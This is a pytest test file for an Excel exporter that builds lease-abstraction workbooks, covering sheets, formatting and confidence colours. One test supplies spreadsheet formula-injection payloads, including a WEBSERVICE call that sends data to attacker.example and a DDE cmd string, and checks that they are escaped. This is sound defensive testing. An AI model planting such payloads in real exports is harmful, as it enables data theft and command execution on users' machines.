"""Tests for ExcelExporter.

Exercises Excel workbook generation including summary sheet, category
sheets, header formatting, confidence fill colors, and edge cases.
"""

from io import BytesIO

import pytest
from openpyxl import load_workbook

from app.services.exports.base import EXPORT_DISCLAIMER, ExportBase
from app.services.exports.excel import (
    CONFIDENCE_FILLS,
    HEADER_FILL,
    HEADER_FONT,
    ExcelExporter,
)
from app.services.exports.templates import TEMPLATES


# -- Sample data --


SAMPLE_EXTRACTION = {
    "landlord_legal_name": {
        "value": "ABC Corp",
        "confidence": 0.95,
        "source_text": "ABC Corp",
    },
    "tenant_legal_name": {
        "value": "Acme Inc",
        "confidence": 0.88,
        "source_text": "Acme Inc",
    },
    "premises_address": {
        "value": "123 Main St",
        "confidence": 0.72,
        "source_text": "123 Main",
    },
    "base_rent_annual": {
        "value": 120000,
        "confidence": 0.90,
        "source_text": "$120,000",
    },
    "lease_term_months": {"value": 60, "confidence": 0.85, "source_text": "60 months"},
}

SAMPLE_CONFIDENCE = {
    "landlord_legal_name": {"score": 0.95, "tier": "high"},
    "tenant_legal_name": {"score": 0.88, "tier": "high"},
    "premises_address": {"score": 0.72, "tier": "medium"},
    "base_rent_annual": {"score": 0.90, "tier": "high"},
    "lease_term_months": {"score": 0.85, "tier": "high"},
}

SAMPLE_RED_FLAGS = [
    {
        "rule_id": "no_cam_cap",
        "name": "cam_cap_percentage",
        "severity": "HIGH",
        "description": "No CAM cap found",
        "triggered_value": "",
    },
]

SAMPLE_CONFIDENCE_WITH_NOT_FOUND = {
    "landlord_legal_name": {"score": 0.95, "tier": "high"},
    "tenant_legal_name": {"score": 0.88, "tier": "high"},
    "premises_address": {"score": 0.0, "tier": "not_found"},
    "base_rent_annual": {"score": 0.0, "tier": "not_found"},
    "lease_term_months": {"score": 0.85, "tier": "high"},
}


# -- Fixtures --


@pytest.fixture
def exporter():
    return ExcelExporter()


def _load_wb(data: bytes):
    return load_workbook(BytesIO(data))


# -- Property tests --


def test_excel_exporter_is_export_base_subclass(exporter):
    assert isinstance(exporter, ExportBase)


def test_excel_exporter_content_type(exporter):
    assert exporter.content_type == (
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    )


def test_excel_exporter_extension(exporter):
    assert exporter.extension == "xlsx"


# -- Generate tests --


def test_generate_returns_bytes(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    assert isinstance(result, bytes)
    assert len(result) > 0


def test_generate_returns_valid_xlsx(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    assert len(wb.sheetnames) > 0


def test_summary_sheet_exists(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    assert "Summary" in wb.sheetnames


def test_summary_sheet_has_title(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    assert ws["A5"].value == "Lease Abstraction Report"


def test_summary_sheet_has_filename(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="my_lease.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    assert ws["A6"].value == "my_lease.pdf"


def test_summary_sheet_has_key_identifiers(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    all_values = [
        ws.cell(row=r, column=c).value
        for r in range(1, 20)
        for c in range(1, 5)
        if ws.cell(row=r, column=c).value
    ]
    text = " ".join(str(v) for v in all_values)
    assert "ABC Corp" in text
    assert "Acme Inc" in text
    assert "123 Main St" in text


def test_excel_exporter_adds_red_flags_appendix_sheet(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    assert "Appendix - Red Flags" in wb.sheetnames
    ws = wb["Appendix - Red Flags"]
    assert ws["A1"].value == "Appendix: Red Flags"
    assert ws["A3"].value == "Field"
    assert ws["B3"].value == "Severity"
    assert ws["C3"].value == "Description"
    assert ws["A4"].value == "CAM Cap %"
    assert ws["B4"].value == "HIGH"
    assert ws["C4"].value == "No CAM cap found"


def test_summary_sheet_has_confidence_distribution(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    all_values = [
        ws.cell(row=r, column=c).value
        for r in range(1, 20)
        for c in range(1, 5)
        if ws.cell(row=r, column=c).value
    ]
    text = " ".join(str(v) for v in all_values)
    assert "Confidence Distribution" in text


def test_summary_sheet_has_red_flag_count(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    all_values = [
        ws.cell(row=r, column=c).value
        for r in range(1, 20)
        for c in range(1, 5)
        if ws.cell(row=r, column=c).value
    ]
    text = " ".join(str(v) for v in all_values)
    assert "Red Flags" in text
    assert "1" in text


def test_summary_sheet_has_ai_disclaimer(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    assert ws["A20"].value == EXPORT_DISCLAIMER


def test_summary_sheet_has_ai_disclaimer_without_red_flags(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    assert ws["A20"].value == EXPORT_DISCLAIMER


def test_14_category_sheets_exist(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=SAMPLE_RED_FLAGS,
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    # Summary + 14 category sheets + red flags appendix
    assert len(wb.sheetnames) == 16
    commercial_sections = TEMPLATES["commercial"].sections
    for section in commercial_sections:
        truncated = section.display_name[:31]
        assert (
            truncated in wb.sheetnames
        ), f"Sheet '{truncated}' not found, got {wb.sheetnames}"


def test_red_flags_appendix_sheet_is_omitted_when_no_red_flags(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    assert "Appendix - Red Flags" not in wb.sheetnames


def test_category_sheet_header_row(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Parties & Property"]
    headers = [ws.cell(row=1, column=c).value for c in range(1, 5)]
    assert headers == ["Field Label", "Value", "Confidence Score", "Confidence Tier"]


def test_category_sheet_data_rows(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Parties & Property"]
    # Row 2 should be landlord (first field in Parties section)
    assert ws.cell(row=2, column=1).value == "Landlord Name"
    assert ws.cell(row=2, column=2).value == "ABC Corp"


def test_excel_export_neutralizes_formula_values(exporter):
    malicious_extraction = {
        **SAMPLE_EXTRACTION,
        "landlord_legal_name": {
            "value": '=WEBSERVICE("https://attacker.example/leak")',
            "confidence": 0.95,
            "source_text": "Landlord exhibit",
        },
        "tenant_legal_name": {
            "value": "+cmd|' /C calc'!A0",
            "confidence": 0.88,
            "source_text": "Tenant exhibit",
        },
        "premises_address": {
            "value": "@SUM(1,1)",
            "confidence": 0.72,
            "source_text": "Premises exhibit",
        },
    }
    malicious_flags = [
        {
            "rule_id": "formula",
            "name": "=FIELD",
            "severity": "+HIGH",
            "description": '-HYPERLINK("https://attacker.example", "click")',
            "triggered_value": "",
        },
    ]

    result = exporter.generate(
        extraction_data=malicious_extraction,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=malicious_flags,
        template="commercial",
        document_filename='=HYPERLINK("https://attacker.example/file")',
    )
    wb = _load_wb(result)
    summary = wb["Summary"]
    parties = wb["Parties & Property"]
    red_flags = wb["Appendix - Red Flags"]

    assert summary["A6"].data_type == "s"
    assert summary["A6"].value == '\'=HYPERLINK("https://attacker.example/file")'
    assert summary["B8"].data_type == "s"
    assert summary["B8"].value == '\'=WEBSERVICE("https://attacker.example/leak")'
    assert parties.cell(row=2, column=2).data_type == "s"
    assert parties.cell(row=2, column=2).value == (
        '\'=WEBSERVICE("https://attacker.example/leak")'
    )
    assert parties.cell(row=3, column=2).value == "'+cmd|' /C calc'!A0"
    assert red_flags["A4"].data_type == "s"
    assert red_flags["A4"].value == "'=FIELD"
    assert red_flags["B4"].data_type == "s"
    assert red_flags["B4"].value == "'+HIGH"
    assert red_flags["C4"].data_type == "s"
    assert red_flags["C4"].value == '\'-HYPERLINK("https://attacker.example", "click")'


def test_confidence_fills_applied(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Parties & Property"]
    # Row 2 (landlord) confidence tier is HIGH
    tier_cell = ws.cell(row=2, column=4)
    assert tier_cell.value == "HIGH"
    # Check fill color is the green for HIGH
    assert tier_cell.fill.start_color.rgb == "00C6EFCE"


def test_header_font_is_white_bold(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Parties & Property"]
    header_cell = ws.cell(row=1, column=1)
    assert header_cell.font.bold is True
    assert header_cell.font.color.rgb == "00FFFFFF"


def test_empty_extraction_data(exporter):
    result = exporter.generate(
        extraction_data={},
        confidence_scores={},
        red_flags=[],
        template="commercial",
        document_filename="empty.pdf",
    )
    wb = _load_wb(result)
    assert "Summary" in wb.sheetnames
    ws = wb["Parties & Property"]
    # Row 2 value column should show "Not found"
    assert ws.cell(row=2, column=2).value == "Not found"


def test_no_red_flags(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    all_values = [
        ws.cell(row=r, column=c).value
        for r in range(1, 20)
        for c in range(1, 5)
        if ws.cell(row=r, column=c).value
    ]
    text = " ".join(str(v) for v in all_values)
    assert "0" in text


def test_office_template(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="office",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    office_sections = TEMPLATES["office"].sections
    for section in office_sections:
        truncated = section.display_name[:31]
        assert truncated in wb.sheetnames


def test_medium_confidence_fill(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Parties & Property"]
    # premises_address is MEDIUM, it's field index 4 in the section (row 5)
    # Find the row with "Premises Address"
    for row_idx in range(2, ws.max_row + 1):
        if ws.cell(row=row_idx, column=1).value == "Premises Address":
            tier_cell = ws.cell(row=row_idx, column=4)
            assert tier_cell.value == "MEDIUM"
            assert tier_cell.fill.start_color.rgb == "00FFEB9C"
            break
    else:
        pytest.fail("Premises Address row not found")


def test_unknown_template_falls_back(exporter):
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE,
        red_flags=[],
        template="nonexistent",
        document_filename="test.pdf",
    )
    assert isinstance(result, bytes)
    wb = _load_wb(result)
    assert len(wb.sheetnames) == 15


def test_confidence_fills_constants():
    assert "HIGH" in CONFIDENCE_FILLS
    assert "MEDIUM" in CONFIDENCE_FILLS
    assert "LOW" in CONFIDENCE_FILLS
    assert "N/A" in CONFIDENCE_FILLS


def test_summary_sheet_has_na_count_for_not_found_fields(exporter):
    """not_found fields must appear as N/A row in summary, not counted in LOW."""
    result = exporter.generate(
        extraction_data=SAMPLE_EXTRACTION,
        confidence_scores=SAMPLE_CONFIDENCE_WITH_NOT_FOUND,
        red_flags=[],
        template="commercial",
        document_filename="test.pdf",
    )
    wb = _load_wb(result)
    ws = wb["Summary"]
    all_values = [
        ws.cell(row=r, column=c).value
        for r in range(1, 20)
        for c in range(1, 5)
        if ws.cell(row=r, column=c).value
    ]
    text = " ".join(str(v) for v in all_values)
    assert "N/A" in text
    # 2 not_found fields should be counted as 2
    assert "2" in text


def test_header_fill_constant():
    assert HEADER_FILL.start_color.rgb == "001F3864"


def test_header_font_constant():
    assert HEADER_FONT.bold is True
    assert HEADER_FONT.color.rgb == "00FFFFFF"
